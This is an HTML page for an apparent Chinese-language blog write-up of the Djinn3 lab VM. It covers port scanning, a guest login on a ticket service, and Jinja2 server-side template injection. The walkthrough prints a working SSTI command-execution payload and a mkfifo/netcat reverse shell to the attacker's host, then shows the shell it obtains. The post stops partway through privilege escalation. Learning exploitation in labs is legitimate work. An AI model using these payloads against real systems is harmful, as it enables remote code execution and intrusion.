@@ -1,0 +1,785 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Djinn3 靶机信息收集12345678┌──(kali㉿kali)-[~&#x2F;Documents&#x2F;djinn3]└─$ sudo nmap --min-rate 10000 -p- 192.168.1.106 PORT      STATE SERVICE22&#x2F;tcp    open  ssh80&#x2F;tcp    open  http5000&#x2F;tcp  open  upnp31337&#x2F;tcp ope">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Djinn3 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/10/02e466a6bb9b.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="Djinn3 靶机信息收集12345678┌──(kali㉿kali)-[~&#x2F;Documents&#x2F;djinn3]└─$ sudo nmap --min-rate 10000 -p- 192.168.1.106 PORT      STATE SERVICE22&#x2F;tcp    open  ssh80&#x2F;tcp    open  http5000&#x2F;tcp  open  upnp31337&#x2F;tcp ope">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3c47ca54ddbb240f97fe54093a6d2765_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/833c17c0a14d38ba54ffceb16d25abac_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e137c72a907bbd1b5c038f352926fd10_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/74dbe07e8d0e27d002a72ac3cb8cfc60_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/9a1e4c0f393962a0afccb43a3cfaed22_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/2c899d2ceba33f00677b7f0a9d7cccd2_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/09aa2ce00857df9fb74c2e587205b176_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/ca41c07055b623e65acfd8f6b109abaa_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/18a5d134348ba2d8c72c8894e4c108d6_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/9e9ec403e9a91065b512c2969247bff3_MD5.png">
+<meta property="article:published_time" content="2023-10-21T12:04:51.000Z">
+<meta property="article:modified_time" content="2023-10-25T12:27:56.054Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/3c47ca54ddbb240f97fe54093a6d2765_MD5.png">
+  
+  
+  
+  <title>Djinn3 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Djinn3 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-21 20:04" pubdate>
+          2023年10月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          133 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Djinn3 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Djinn3-靶机"><a href="#Djinn3-靶机" class="headerlink" title="Djinn3 靶机"></a>Djinn3 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/djinn3]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.1.106 <br><br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>5000/tcp  open  upnp<br>31337/tcp open  Elite<br></code></pre></td></tr></table></figure>
+
+<p>开放了 22, 80, 5000, 31337 端口，31337 端口比较特别，查了下资料，这个端口和 leetspeak 语法比较密切</p>
+<blockquote>
+<p>This port number means “elite” in hacker&#x2F;cracker spelling (3&#x3D;E, 1&#x3D;L, 7&#x3D;T) and because of the special meaning is often used for interesting stuff… Many backdoors&#x2F;trojans run on this port, the most notable being Back Orifice.</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/djinn3]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,5000,31337 192.168.1.106<br><br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 e6:44:23:ac:b2:d9:82:e7:90:58:15:5e:40:23:ed:65 (RSA)<br>|   256 ae:04:85:6e:cb:10:4f:55:4a:ad:96:9e:f2:ce:18:4f (ECDSA)<br>|_  256 f7:08:56:19:97:b5:03:10:18:66:7e:7d:2e:0a:47:42 (ED25519)<br>80/tcp    open  http    lighttpd 1.4.45<br>|_http-server-header: lighttpd/1.4.45<br>|_http-title: Custom-ers<br>5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)<br>|_http-server-header: Werkzeug/1.0.1 Python/3.6.9<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html; charset=utf-8).</span><br><span class="hljs-string">31337/tcp open  Elite?</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL: </span><br><span class="hljs-string">|     username&gt;</span><br><span class="hljs-string">|   GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: </span><br><span class="hljs-string">|     username&gt; password&gt; authentication failed</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></code></pre></td></tr></table></figure>
+
+<p>尝试搜索 Werkzeug 1.0.1 是否存在漏洞，不符合此网站结构；Ubuntu 操作系统；31337 端口需要登录名和密码</p>
+<h2 id="Web-信息收集"><a href="#Web-信息收集" class="headerlink" title="Web 信息收集"></a>Web 信息收集</h2><p>查看默认的 80 端口</p>
+<p><img src="/pic/3c47ca54ddbb240f97fe54093a6d2765_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看网页源码未得到隐藏信息，从中得到了几个可能有用的信息</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">mzfr.<span class="hljs-keyword">me</span><br>PHPLD Templates<br></code></pre></td></tr></table></figure>
+
+<p>再查看 5000 端口，关键词 <code>this ticketing software</code></p>
+<p><img src="/pic/833c17c0a14d38ba54ffceb16d25abac_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>依次查看链接得到了以下信息</p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-number">1</span>       <span class="hljs-number">2792</span>    Add authentication <span class="hljs-keyword">to</span> the ticket managment system.      open    link<br>Currently the ticket management <span class="hljs-built_in">and</span> viewing system <span class="hljs-built_in">is</span> open <span class="hljs-built_in">and</span> doesn<span class="hljs-comment">&#x27;t require any kind of authorization. We should add the support for authorization via passwords and also via user API key or token. </span><br><br><br><span class="hljs-number">2</span>       <span class="hljs-number">4567</span>    Remove <span class="hljs-keyword">default</span> user guest <span class="hljs-keyword">from</span> the ticket creation service.     open    link<br>Remove all the <span class="hljs-keyword">default</span> user that exists <span class="hljs-keyword">on</span> the ticket creation service <span class="hljs-keyword">as</span> it could be a real hazadous <span class="hljs-keyword">to</span> leave any entry point <span class="hljs-keyword">for</span> unexpected guests. Also I would recommend adding an checks <span class="hljs-keyword">for</span> the complexity <span class="hljs-keyword">of</span> the password.<br><br><br><span class="hljs-number">3</span>       <span class="hljs-number">8345</span>    <span class="hljs-keyword">Error</span> <span class="hljs-keyword">while</span> updating postgres queries   <span class="hljs-keyword">In</span> progress     link<br> are some issues <span class="hljs-keyword">with</span> the postgres queries <span class="hljs-built_in">and</span> I think that this needs <span class="hljs-keyword">to</span> be addressed ASAP <br><br><br><span class="hljs-number">4</span>       <span class="hljs-number">7723</span>    Jack will temporarily handling the risk limit UI        open    link<br><span class="hljs-keyword">As</span> we know umang has resigned, so <span class="hljs-keyword">until</span> we find the replacement Jack will be handling the lead <span class="hljs-keyword">on</span> risk limit UI. RLUI team has <span class="hljs-keyword">to</span> keep Jack about all the development that has been happening. <br><br><br><span class="hljs-number">5</span>       <span class="hljs-number">2984</span>    Update the user information     <span class="hljs-keyword">In</span> progress     link<br>It<span class="hljs-comment">&#x27;s a request to the helpdesk that since lot of people(jason, david, freddy etc) were either fired or resigned. It would be nice if we can remove their accounts and privileges from the system. </span><br><br><br><span class="hljs-number">6</span>       <span class="hljs-number">2973</span>    Complete the honeypot project   <span class="hljs-keyword">In</span> progress     link<br>Small reminder, the deadline <span class="hljs-keyword">for</span> the honeypot project <span class="hljs-built_in">is</span> <span class="hljs-keyword">next</span> week, we better finish that ASAP. <br></code></pre></td></tr></table></figure>
+
+<p>这里应该是一个业务反馈系统，包含了一些可能有用的信息</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Remove default user guest from the ticket creation service.<br><span class="hljs-symbol">username:</span> umang, <span class="hljs-keyword">Jack, </span><span class="hljs-keyword">jason, </span>david, freddy<br>accounts <span class="hljs-keyword">and </span>privileges: <span class="hljs-keyword">jason, </span>david, freddy <br></code></pre></td></tr></table></figure>
+
+<p><code>ASAP</code> 是 <code>ASAP</code> 的英文缩写，表示 “尽快，越快越好”（As Soon As Possible）</p>
+<p>一开始的思路：使用上述用户名和弱密码尝试爆破 31337 端口。但是爆破手法不知道，而且手动尝试了一下最基础的弱密码，失败。</p>
+<p>实在找不到入口点，尝试了对 <code>http://192.168.1.106:5000/?id=3248</code> 进行 sql 注入和 fuzz 的尝试。各个端口都进行了目录爆破，除了 images 目录，没发现新的入口，又尝试了对 images 目录进行了爆破，虽然发现了一些图片，但是并没有发现暴露面和敏感信息。还尝试了模板注入，没反应（而且不理解原理）</p>
+<p>看了 WP 发现用户名和密码是 guest，对于 <code>Remove default user guest from the ticket creation service.</code> 这句话暴露的信息敏感度不足，还是要提升自己的意识</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/djinn3]<br>└─$ nc 192.168.1.106 31337                   <br>username&gt; guest<br>password&gt; guest<br><br>Welcome to our own ticketing system. This application is still under <br>development so <span class="hljs-keyword">if</span> you find any issue please report it to mail@mzfr.me<br><br>Enter <span class="hljs-string">&quot;help&quot;</span> to get the list of available commands.<br><br>&gt; <span class="hljs-built_in">help</span><br><br>        <span class="hljs-built_in">help</span>        Show this menu<br>        update      Update the ticketing software<br>        open        Open a new ticket<br>        close       Close an existing ticket<br>        <span class="hljs-built_in">exit</span>        Exit<br><br></code></pre></td></tr></table></figure>
+
+<p>有些基础的命令，试着运行这几个命令，发现 update 权限不足，open 可以创建新的条目项。</p>
+<p>尝试在 Description 中放入反弹 shell 的代码，访问并没利用成功，应该是因为没有经过 PHP 解析</p>
+<h2 id="SSTI-模板注入"><a href="#SSTI-模板注入" class="headerlink" title="SSTI 模板注入"></a>SSTI 模板注入</h2><p>在这里也卡了很久，看了 WP 发现是模板注入，确实缺乏对这个漏洞的意识，需要了解和复现一些常见的模板注入漏洞。写了一篇基础的模板注入漏洞的理解向的总结[[..&#x2F;technique&#x2F;web&#x2F;SSTI 模板注入|SSTI 模板注入]]</p>
+<p>这里先使用简单的数学表达式来作为测试用例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; open<br>Title: testet<br>Description: &#123;&#123;1338-1&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>查看网页发现得到了计算结果，应该是存在模板注入的</p>
+<p><img src="/pic/e137c72a907bbd1b5c038f352926fd10_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们要通过下图的尝试来判断是什么模板</p>
+<p><img src="/pic/74dbe07e8d0e27d002a72ac3cb8cfc60_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>依次尝试，得判断出可能是 jinja2 或者 Twing</p>
+<p><img src="/pic/9a1e4c0f393962a0afccb43a3cfaed22_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据之前 nmap 的结果，搜索 <code>Werkzeug SSTI</code></p>
+<p><img src="/pic/2c899d2ceba33f00677b7f0a9d7cccd2_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到的结果大都是 jinja2 ，先尝试 jinja2 吧</p>
+<p>由于这次模板注入的点需要反复使用命令行操作，所以优先使用不需要查找下属模块是否存在的 exp</p>
+<p>寻找 exp 主要参考了 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#jinja-injection-without-less-than-class-object-greater-than">Jinja2 SSTI - HackTricks</a> 和 <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2">PayloadsAllTheThings&#x2F;Server Side Template Injection&#x2F;README.md at master · swisskyrepo&#x2F;PayloadsAllTheThings (github.com)</a> 尝试添加：</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">&gt; open</span><br><span class="language-xml">Title: test1</span><br><span class="language-xml">Description: &#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>()._module.__builtins__[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&quot;ls&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#123;%endif%&#125;&#123;% endfor %&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/09aa2ce00857df9fb74c2e587205b176_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用成功，改成反弹 shell 的命令</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">&gt; open</span><br><span class="language-xml">Title: test2</span><br><span class="language-xml">Description: &#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>()._module.__builtins__[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.1.101 444 &gt;/tmp/f&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#123;%endif%&#125;&#123;% endfor %&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>反弹成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/djinn3]<br>└─$ sudo nc -lvnp 444              <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 444 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.106] 47944<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (566): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@djinn3:/opt/.web$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@djinn3:/opt/.web$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@djinn3:/opt/.web$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:34:39:41 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.1.106/24 brd 192.168.1.255 scope global dynamic eth0<br>       valid_lft 452sec preferred_lft 452sec<br>    inet6 fe80::a00:27ff:fe34:3941/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>www-data@djinn3:/opt/.web$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux djinn3 4.15.0-101-generic <span class="hljs-comment">#102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@djinn3:/opt/.web$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>    <br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@djinn3:/opt/.web$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> www-data:<br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>查看当前目录下的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@djinn3:/opt/.web$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 24K<br>277262 drwxr-xr-x 4 www-data www-data 4.0K Jun  4  2020 .<br>524412 drwxr-xr-x 4 root     root     4.0K Jun  4  2020 ..<br>262163 -rw-r--r-- 1 www-data www-data 2.2K Oct 25 08:05 data.json<br>277263 drwxr-xr-x 4 www-data www-data 4.0K May 10  2020 static<br>294974 drwxr-xr-x 2 www-data www-data 4.0K May 17  2020 templates<br>262350 -rwxr-xr-x 1 www-data www-data 1.4K May 17  2020 webapp.py<br></code></pre></td></tr></table></figure>
+
+<p>此目录中在 webapp.py 中看到了 <code>app.secret_key = &quot;hackthedamnplanet&quot;</code> 尝试了密码重用，切换登录失败</p>
+<p>这个目录有点奇怪，去上一层目录看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@djinn3:/opt$ <span class="hljs-built_in">ls</span> -liha<br><span class="hljs-built_in">ls</span> -liha<br>total 24K<br>524412 drwxr-xr-x  4 root     root     4.0K Jun  4  2020 .<br>     2 drwxr-xr-x 23 root     root     4.0K Jun  1  2020 ..<br>556546 -rwxr-xr-x  1 saint    saint    1.4K Jun  4  2020 .configuration.cpython-38.pyc<br>556547 -rwxr-xr-x  1 saint    saint     661 Jun  4  2020 .syncer.cpython-38.pyc<br>   140 drwxr-xr-x  2 www-data www-data 4.0K May 17  2020 .tick-serv<br>277262 drwxr-xr-x  4 www-data www-data 4.0K Jun  4  2020 .web<br></code></pre></td></tr></table></figure>
+
+<p>发现了两个 pyc 文件和 <code>.tick-serv</code> 目录，其中 <code>.tick-serv</code> 目录中的代码时 31337 端口的运行程序。</p>
